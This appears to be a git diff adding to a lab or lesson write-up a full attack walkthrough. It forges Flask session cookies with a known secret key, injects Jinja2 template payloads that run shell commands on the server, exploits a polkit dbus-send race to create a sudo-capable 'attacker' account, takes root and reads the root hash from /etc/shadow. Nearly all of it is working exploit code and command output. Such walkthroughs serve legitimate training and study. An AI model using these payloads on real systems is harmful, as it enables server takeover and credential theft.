@@ -406,43 +406,308 @@ drwxr-xr-x 53 root root 4.0K Feb  8 19:13 ..
 (poc-venv) r...:~/lesson# pip3 install flask requests waitress
 ```
 
+<img width="944" height="603" alt="image" src="https://github.com/user-attachments/assets/dc136aef-4b41-4f02-8135-4aeb8cadeec7" />
 
-```bash
+<br>
+<br>
 
-```
-
-
-
-```bash
-
-```
-
-
-```bash
-
-```
+<img width="1082" height="513" alt="image" src="https://github.com/user-attachments/assets/d24437e7-a153-4638-a2a2-bd04c88cfa1d" />
 
 
 
 ```bash
+#!/usr/bin/env python3
+from flask import Flask, session, request
+from waitress import serve
+import requests, threading, time
+
+app = Flask(__name__)
+app.config["SECRET_KEY"] = "1a98164eacf96276995566d0c4a4a413"
+
+@app.route("/")
+def main():
+    session["auth"] = "True"
+    session["username"] = "Pentester"
+    return "Check your cookies", 200
+
+thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
+thread.setDaemon(True)
+thread.start()
+
+time.sleep(1)
+print(requests.get("http://localhost:9000/").cookies.get("session"))
+```
+
+
+```bash
+(poc-venv) ...:~/lesson/poc-venv# ./bin/python3 a.py
+eyJhdXRoIjoiVHJ1ZSIsInVzZXJuYW1lIjoiUGVudGVzdGVyIn0.aYjo7Q.hOtEDEOxh2VGxQ-tO2lkiEibi3A
+```
+
+
+<img width="1087" height="541" alt="image" src="https://github.com/user-attachments/assets/84dd8e51-23c7-4b60-88e4-bbc51264ceb7" />
+
+
+
+```bash
+#!/usr/bin/env python3
+from flask import Flask, session, request
+from waitress import serve
+import requests, threading, time
+
+app = Flask(__name__)
+app.config["SECRET_KEY"] = "1a98164eacf96276995566d0c4a4a413"
+
+@app.route("/")
+def main():
+    session["auth"] = "True"
+    session["username"] = "{{9*9}}"
+    return "Check your cookies", 200
+
+thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
+thread.setDaemon(True)
+thread.start()
+
+time.sleep(1)
+print(requests.get("http://localhost:9000/").cookies.get("session"))
 
 ```
 
 
 ```bash
+:~/lesson/poc-venv# ./bin/python3 a.py
+eyJhdXRoIjoiVHJ1ZSIsInVzZXJuYW1lIjoie3s5Kjl9fSJ9.aYjqFg.X-v_pQ3cG8OkrnpcsW8FJy4keQ4
+```
+
+<img width="1093" height="469" alt="image" src="https://github.com/user-attachments/assets/13b06771-03ff-4d3d-b449-60dd949f336e" />
+
+<br>
+<br>
+<br>
+
+```bash
+#!/usr/bin/env python3
+from flask import Flask, session, request
+from waitress import serve
+import requests, threading, time
+
+app = Flask(__name__)
+app.config["SECRET_KEY"] = "1a98164eacf96276995566d0c4a4a413"
+
+@app.route("/")
+def main():
+    session["auth"] = "True"
+    session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"""
+    return "Check your cookies", 200
+
+thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
+thread.setDaemon(True)
+thread.start()
+
+time.sleep(1)
+print(requests.get("http://localhost:9000/").cookies.get("session"))
 
 ```
+
+
+```bash
+:~/lesson/poc-venv# ./bin/python3 a.py
+.eJwdyEEKgCAQAMC_7EWF8AG9o1uEbLaZYCqunsS_J92G6YCtPrDCVhrBAo2pRHxpTu82xds7bYwNyGzMlI--_nAhnRhm7iKxOHROmaIUgYXShfCSagwYH0KTIT4.aYjqlg.9h0c2WvII4utL3FCdmWG1tanMXc
+```
+
+
+<img width="1094" height="604" alt="image" src="https://github.com/user-attachments/assets/863990e3-0fb5-4aef-8f64-55afed131353" />
+
+
+<br>
+<br>
+<br>
+
+
+```bash
+#!/usr/bin/env python3
+from flask import Flask, session, request
+from waitress import serve
+import requests, threading, time
+
+app = Flask(__name__)
+app.config["SECRET_KEY"] = "1a98164eacf96276995566d0c4a4a413"
+
+@app.route("/")
+def main():
+    session["auth"] = "True"
+    session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('echo ""; id; whoami; echo ""; which nc bash curl wget; echo ""; sestatus 2>&1; aa-status 2>&1; echo ""; cat /etc/*-release; echo""; cat /etc/iptables/*').read()}}"""
+    return "Check your cookies", 200
+
+thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
+thread.setDaemon(True)
+thread.start()
+
+time.sleep(1)
+print(requests.get("http://localhost:9000/").cookies.get("session"))
+
+```
+
+
+```bash
+~/lesson/poc-venv# ./bin/python3 a.py
+.eJxdissOgjAQRX9l0oU8IhBdSuJXuBNDhjLSJqUlnTYsCP8u0Q24O_ecuwiMQYmbePhI4iwik7c40maWRTr71kPZttIgc9tupK0OXxiM69Bs8pk4Tl7l5CayaUJSOWhEI2rQfQ2zcjjqGnZ6VloqsBI6ZAUyegPzQOHwYeKAITJc76dLDYjFYe-eEgNUFGSVF54MIdMv_1U9BewMcZUnWekJ-zRbV7F-AHqJUzY.aYjrPA.wl922E57Afh54bR47YoWbDgvYIs
+```
+
+<img width="1089" height="712" alt="image" src="https://github.com/user-attachments/assets/89f65e1f-c57f-49a9-aead-ab078a504bc7" />
+
+<br>
+<br>
+<br>
+
+
+```bash
+Admin Console Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data /usr/bin/nc /usr/bin/bash /usr/bin/curl /usr/bin/wget /bin/sh: 1: sestatus: not found You do not have enough privilege to read the profile set. apparmor module is loaded. DISTRIB_ID=Ubuntu DISTRIB_RELEASE=20.04 DISTRIB_CODENAME=focal DISTRIB_DESCRIPTION="Ubuntu 20.04.2 LTS" NAME="Ubuntu" VERSION="20.04.2 LTS (Focal Fossa)" ID=ubuntu ID_LIKE=debian PRETTY_NAME="Ubuntu 20.04.2 LTS" VERSION_ID="20.04" HOME_URL="https://www.ubuntu.com/" SUPPORT_URL="https://help.ubuntu.com/" BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/" PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy" VERSION_CODENAME=focal UBUNTU_CODENAME=focal # Generated by iptables-save v1.8.4 on Tue Jun 22 22:27:55 2021 *filter :INPUT ACCEPT [174:25634] :FORWARD ACCEPT [0:0] :OUTPUT DROP [0:0] -A INPUT -p icmp -j DROP -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A OUTPUT -o lo -j ACCEPT -A OUTPUT -p tcp -m multiport --dports 443,445,80,25,53 -j ACCEPT -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT -A OUTPUT -p icmp -j ACCEPT COMMIT # Completed on Tue Jun 22 22:27:55 2021 # Generated by ip6tables-save v1.8.4 on Tue Jun 22 22:27:55 2021 *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] COMMIT # Completed on Tue Jun 22 22:27:55 2021
+
+There have been 7459 unique visitors to the site!
+```
+
+```bash
+Admin Console Welcome,
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data
+
+/usr/bin/nc
+/usr/bin/bash
+/usr/bin/curl
+/usr/bin/wget
+
+/bin/sh: 1: sestatus: not found
+You do not have enough privilege to read the profile set.
+apparmor module is loaded.
+
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=20.04
+DISTRIB_CODENAME=focal DISTRIB_DESCRIPTION="Ubuntu 20.04.2 LTS" NAME="Ubuntu" VERSION="20.04.2 LTS (Focal Fossa)" ID=ubuntu ID_LIKE=debian PRETTY_NAME="Ubuntu 20.04.2 LTS" VERSION_ID="20.04" HOME_URL="https://www.ubuntu.com/" SUPPORT_URL="https://help.ubuntu.com/" BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/" PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy" VERSION_CODENAME=focal UBUNTU_CODENAME=focal # Generated by iptables-save v1.8.4 on Tue Jun 22 22:27:55 2021 *filter :INPUT ACCEPT [174:25634] :FORWARD ACCEPT [0:0] :OUTPUT DROP [0:0] -A INPUT -p icmp -j DROP -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A OUTPUT -o lo -j ACCEPT -A OUTPUT -p tcp -m multiport --dports 443,445,80,25,53 -j ACCEPT -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT -A OUTPUT -p icmp -j ACCEPT COMMIT # Completed on Tue Jun 22 22:27:55 2021 # Generated by ip6tables-save v1.8.4 on Tue Jun 22 22:27:55 2021 *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] COMMIT # Completed on Tue Jun 22 22:27:55 2021
+
+There have been 7459 unique visitors to the site!
+```
+
+
+```bash
+:~/lesson/poc-venv# ./bin/python3 a.py
+.eJxNzE8LgjAcxvG38mOHphD7YzuEhu8h8FIRY9rUkdtk05P53pMuefvy4eFZkJqnHuWoCrNGRzRHHZyyepNlabxrTUekbAYVo5RbGWemX3SDr9Ww4QP7iJ9k9KN2Cbbv1rQe6GRHeq-u7FaAa4AzcmaEZ4JwwUGIE7DLfwIfoLVxNPZQ7jQrD7yAYHdnOCVBq1eSritav6RYOrc.aYjsWw.cIp05caJD5DZEYBpSvBvUG9FJAE
+```
+
+
+<img width="941" height="347" alt="image" src="https://github.com/user-attachments/assets/4d823647-f0c0-44fe-bbe4-cc2d6da84f8b" />
+
+<br>
+<br>
+<br>
+
+<img width="938" height="538" alt="image" src="https://github.com/user-attachments/assets/fe181d4c-1798-48ee-9c66-4154a85a0abd" />
 
 
 
 ```bash
+www-data@websrv1:/opt/site$ cat /etc/passwd | grep -i /bin/bash
+root:x:0:0:root:/root:/bin/bash
+www-data@websrv1:/opt/site$ 
+```
 
+```bash
+www-data@websrv1:/opt/site$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+
+real	0m0.011s
+user	0m0.001s
+sys	0m0.000s
 ```
 
 
 ```bash
-
+www-data@websrv1:/opt/site$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
+[1] 1183
 ```
+
+```bash
+www-data@websrv1:/opt/site$ id attacker
+uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),27(sudo)
+[1]+  Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
+www-data@websrv1:/opt/site$ 
+```
+
+```bash
+www-data@websrv1:/opt/site$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
+[1] 1224
+```
+
+```bash
+www-data@websrv1:/opt/site$ su attacker
+Password: 
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+attacker@websrv1:/opt/site$ 
+```
+
+
+<img width="943" height="438" alt="image" src="https://github.com/user-attachments/assets/ad8379b9-6fd6-4561-9aff-4b3d319229ca" />
+
+<br>
+<br>
+<br>
+
+
+```bash
+attacker@websrv1:/opt/site$ sudo -s
+[sudo] password for attacker: 
+root@websrv1:/opt/site# 
+```
+
+```bash
+root@websrv1:/opt/site# whoami
+root
+```
+
+```bash
+root@websrv1:/opt/site# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+```bash
+root@websrv1:/opt/site# ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
+    link/ether 0a:3c:4d:cd:9f:41 brd ff:ff:ff:ff:ff:ff
+    inet 10.80.142.143/18 brd 10.80.191.255 scope global dynamic eth0
+       valid_lft 1060sec preferred_lft 1060sec
+    inet6 fe80::83c:4dff:fecd:9f41/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
+
+<img width="949" height="333" alt="image" src="https://github.com/user-attachments/assets/5ea18733-8abd-4237-9c00-fb1cefc8e19f" />
+
+<br>
+<br>
+<br>
+
+```bash
+root@websrv1:~# cat /etc/shadow | grep root
+root:$6$./Fh3mWMsk8X29kq$6CvaDzV7zlXKn1MMQjXtO.abB4/7ecNKBFkQvEWsLkgM8raAZeuSHZurnXG01pqZ4BY2ubk/WgIbo4ee.wnaP0:18791:0:99999:7:::
+```
+
+
+<img width="943" height="129" alt="image" src="https://github.com/user-attachments/assets/666a2851-8397-4f25-9a08-fa76c9c99335" />
+
+<br>
+<br>
+<br>
+
+
 
 
 
